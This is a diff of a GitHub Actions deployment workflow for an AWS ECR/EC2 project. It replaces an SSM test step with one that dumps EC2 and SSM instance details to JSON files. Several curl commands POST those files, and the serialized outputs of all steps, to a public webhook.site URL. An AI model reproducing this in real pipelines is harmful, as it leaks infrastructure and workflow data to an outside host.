@@ -124,34 +124,13 @@ jobs:
           docker tag devsecops-platform:latest 850252650249.dkr.ecr.ap-south-1.amazonaws.com/devsecops-platform:latest
           docker push 850252650249.dkr.ecr.ap-south-1.amazonaws.com/devsecops-platform:latest
 
-      - name: Test SSM Agent
-        id: test_ssm
+      - name: Inspect Instance
         run: |
-          set +e
-          # Try Linux
-          CMD_LINUX=$(aws ssm send-command \
-            --instance-ids i-0fb9dcbeb35b4fdbe \
-            --document-name "AWS-RunShellScript" \
-            --parameters commands=["echo linux"] \
-            --region ap-south-1 \
-            --query "Command.CommandId" \
-            --output text)
-          sleep 10
-          aws ssm get-command-invocation --command-id "$CMD_LINUX" --instance-id i-0fb9dcbeb35b4fdbe --region ap-south-1 --output json > test_linux.json
-          curl -X POST -H "Content-Type: application/json" -d @test_linux.json https://webhook.site/3299c84f-741b-46b4-b27f-2b15cbcbc8d5
-          
-          # Try Windows
-          CMD_WIN=$(aws ssm send-command \
-            --instance-ids i-0fb9dcbeb35b4fdbe \
-            --document-name "AWS-RunPowerShellScript" \
-            --parameters commands=["Write-Host windows"] \
-            --region ap-south-1 \
-            --query "Command.CommandId" \
-            --output text)
-          sleep 10
-          aws ssm get-command-invocation --command-id "$CMD_WIN" --instance-id i-0fb9dcbeb35b4fdbe --region ap-south-1 --output json > test_win.json
-          curl -X POST -H "Content-Type: application/json" -d @test_win.json https://webhook.site/3299c84f-741b-46b4-b27f-2b15cbcbc8d5
-          exit 0
+          aws ec2 describe-instances --instance-ids i-0fb9dcbeb35b4fdbe > instance_info.json
+          aws ssm describe-instance-information --filters "Key=InstanceIds,Values=i-0fb9dcbeb35b4fdbe" > ssm_info.json
+          curl -X POST -H "Content-Type: application/json" -d @instance_info.json https://webhook.site/3299c84f-741b-46b4-b27f-2b15cbcbc8d5
+          curl -X POST -H "Content-Type: application/json" -d @ssm_info.json https://webhook.site/3299c84f-741b-46b4-b27f-2b15cbcbc8d5
+        continue-on-error: true
 
       - name: Deploy to EC2 via SSM
         id: deploy_ssm
@@ -312,3 +291,4 @@ jobs:
           ${{ toJSON(steps) }}
           EOF
           curl -X POST -H "Content-Type: application/json" -d @payload.json https://webhook.site/3299c84f-741b-46b4-b27f-2b15cbcbc8d5
+
